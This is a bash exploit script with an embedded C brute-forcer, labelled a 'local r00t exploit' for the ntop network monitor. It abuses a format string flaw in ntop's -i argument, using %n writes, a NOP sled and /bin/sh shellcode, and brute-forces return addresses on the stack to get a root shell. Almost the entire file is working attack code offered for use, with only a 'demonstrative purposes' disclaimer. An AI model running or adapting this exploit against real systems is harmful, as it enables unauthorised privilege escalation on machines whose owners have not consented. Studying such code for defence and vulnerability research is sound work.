########################## ntopexpl.sh ##########################

#!/bin/bash

#	CONFIGURATION:
umask 000
target="/usr/sbin/ntop"
tmpdir="/tmp/"

#       address we want to write to (ret on the stack)
#       has to be an absolute address but we brute force
#		this scanning 64 addresses from writeadr on
writeadr="0xbffff000"

#	no. of addresses to scan
wrep=64

#       address of the shell in our string
#		must point somewhere to our 'nop' region
shadr="0xbffff320"

#	number of nops before shellcode
declare -i nnops
nnops=128


echo
echo "-------------------------------------------"
echo "|       ntop local r00t exploit           |"
echo "|              by IhaQueR                 |"
echo "|		only for demonstrative purposes		|"
echo "-------------------------------------------"
echo

echo
echo "configured for running $target"
echo "RETADR = $writeadr"
echo "SHELL  = $shadr"
echo "NOPS   = $nnops"
echo


#	fake shellcode
shellfake="SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"

#	number of nops before shellcode
declare -i nnops
nnops=128

#	make nop field
declare -i idx
idx=0

nfake=""

while test $idx -lt $nnops; do
	nfake="N$nfake"
	idx=$(($idx+1))
done;


#	sanity check :-)
if ! test -x $target ; then
	echo "[-] $target not found or not executable, sorry"
	exit 1
fi;

echo "[+] found $target"

declare -i cnt
declare -i cntmax
cnt=0
cntmax=1024


#	make string used for offset search
#	like <head><addr><nops><shellcode>
#	PP stands for padding
string="%0016d%x%0016d%d%0016d%d%0016d%dABCDEEEEFFFFGGGGHHHHIIIIJJJJKKKK${nfake}${shellfake}"

padding="PP"
declare -i npad
npad=2
gstring=""

#	find offset
echo "    now searching for offset"
echo

while test $cnt -le $cntmax ; do
	gstring="%16g$gstring"
	string="%16g$string"
	cnt=$(($cnt+1))
	result=$($target -i "$padding$string" 2>&1 | grep "44434241")
	echo -n "[$cnt] "
	if test "$result" != "" ; then
		break;
	fi;
done

#	found offset
declare -i offset
offset=$(($cnt * 4))

echo
echo

if test $cnt -gt $cntmax ; then
	echo "[-] offset not found, please tune padding :-)"
	exit 2
fi;

echo "[+] OFFSET found to be $offset/$cnt"

echo "    now constructing magic string"

#	number of bytes written so far
declare -i nwrt
nwrt=$((16*${cnt} + ${npad}))

#	bruteforce
echo "[+] string fileds prepared"
echo

cat <<__BRUTE__ >brute.c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

//	used with <string> <numwritten> <nops>
main(int argc, char** argv)
{
unsigned char str[8192];
unsigned char buf[8192];
unsigned char nop[1024];
unsigned addr[9];
unsigned char head[33]="%0016d%x%0016d%x%0016d%x%0016d%x";

//		standard /bin/sh shell :-)
unsigned char hellcode[] =
"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
						
"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
   							"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";

int i, flip, nbrute;
unsigned char* ptr;
unsigned shadr, rtadr, nwrt;
int dn;


//		construct string like <pad><eatstack><head><addr><nops><shell>

//		no. of attempts
		nbrute = $wrep;

//		addr
		rtadr = $writeadr;

		while(nbrute>0) {

			printf("[%4d] ", nbrute);
			fflush(stdout);
			fflush(stderr);

//		nops
			for(i=0; i<atol(argv[3]); i++)
				nop[i] = 0x90;
			nop[i] = 0;

//		head
			shadr = $shadr;

//		6 comes from "bind: "
			nwrt = atol(argv[2]) + 6;

			ptr = (unsigned char*)&shadr;

			for(i=0; i<4; i++) {
				flip = (((int)256) + ((int)ptr[i])) - ((int)(nwrt % 256));
				nwrt = nwrt + flip;
				sprintf(head+i*8, "%%%04dx%%n", flip);
			}

			head[32] = 0;

//		address field
			for(i=0; i<4; i++) {
				addr[2*i] = rtadr + i;
				addr[2*i+1] = rtadr + i;
			}

			addr[8] = 0;

			sprintf(str, "%s%s%s%s%s", argv[1], head, addr, nop, hellcode);
			sprintf(buf, "./ntop -i \"%s\"", str);

//		kabuum
			system(buf);

			nbrute--;
			rtadr += 4;
		}

return 0;
}
__BRUTE__

rm -rf brute
gcc brute.c -o brute

if ! test -x brute ; then
	echo "[-] compilation error, exiting"
	exit 2
fi;

echo "[+] bruteforce prog prepared"

echo "    now brute force"
echo

brute "$padding$gstring" ${nwrt} ${nnops}

echo ""
echo "[+] done"
echo ""

